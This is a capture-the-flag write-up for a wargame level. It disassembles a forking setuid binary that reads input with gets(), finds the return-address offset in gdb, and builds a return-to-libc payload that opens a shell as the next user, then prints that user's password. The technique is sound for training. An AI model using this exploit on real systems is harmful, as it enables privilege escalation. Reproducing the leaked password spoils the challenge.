# Search 

```
$ ls -l
-rwsr-s---+ 1 level05 users 7797 Sep 10  2016 level04

$ ./level04 
Give me some shellcode, k
\x\x\x\x\x
child is exiting...
```

# analyze with gdb

```
$ gdb level04

(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    %eax,0xac(%esp)
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx
   0x080486e6 <+30>:    mov    $0x0,%eax
   0x080486eb <+35>:    mov    $0x20,%edx
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp)
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp)
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp)
   0x08048711 <+73>:    jne    0x8048769 <main+161>
   0x08048713 <+75>:    movl   $0x1,0x4(%esp)
   0x0804871b <+83>:    movl   $0x1,(%esp)
   0x08048722 <+90>:    call   0x8048540 <prctl@plt>
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:   movl   $0x8048903,(%esp)
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    0x20(%esp),%eax
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt>
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop
   0x08048769 <+161>:   lea    0x1c(%esp),%eax
   0x0804876d <+165>:   mov    %eax,(%esp)
   0x08048770 <+168>:   call   0x80484f0 <wait@plt>
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp)
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax
   0x0804878a <+194>:   test   %eax,%eax
   0x0804878c <+196>:   je     0x80487ac <main+228>
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242>
   0x080487ac <+228>:   movl   $0x804891d,(%esp)
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>
   0x080487b8 <+240>:   jmp    0x804881a <main+338>
   0x080487ba <+242>:   movl   $0x0,0xc(%esp)
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp)
   0x080487ca <+258>:   mov    0xac(%esp),%eax
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp)
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp)
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
   0x080487f6 <+302>:   movl   $0x8048931,(%esp)
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   movl   $0x9,0x4(%esp)
   0x0804880a <+322>:   mov    0xac(%esp),%eax
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt>
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret    
```

understanding the main:
- a fork is called, and ptrace is used to keep an eye on
- if exec() is called the child is killed so we cannot use it in our shellcode

## setting to follow child process

we have to set this ```set follow-fork-mode child``` before running and searching for the offset, because the segf happen in child process and we must know what is in eip at this moment.

# libc exploit

lets try a [return to libc exploit](https://beta.hackndo.com/retour-a-la-libc/) with system, exit and '/bin/sh'\
corresponding to : ```$ exit ; /bin/sh``` we need:
- the address of them (system, exit and '/bin/sh')
- the offset to eip (next instruction register)

### find offset

```
$ gdb -q level04
Reading symbols from /home/users/level04/level04...(no debugging symbols found)...done.
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04 
[New process 1669]
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 1669]
0x41326641 in ?? ()
(gdb) i r eip
eip            0x41326641       0x41326641
```

thanks to [this generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?) 0x41326641 -> offset 156

```
(gdb) info function system
0xf7e6aed0  system

(gdb) info function exit
0xf7e5eb70  exit

(gdb) info proc map
Start Addr   End Addr       Size     Offset objfile
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so

(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```
# payload

```
$ python -c "print('a' * 156 + '\xd0\xae\xe6\xf7' + '\x70\xeb\xe5\xf7' + '\xec\x97\xf8\xf7')" > /tmp/exploit

$ cat /tmp/exploit - | ./level04
Give me some shellcode, k
whoami
level05
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```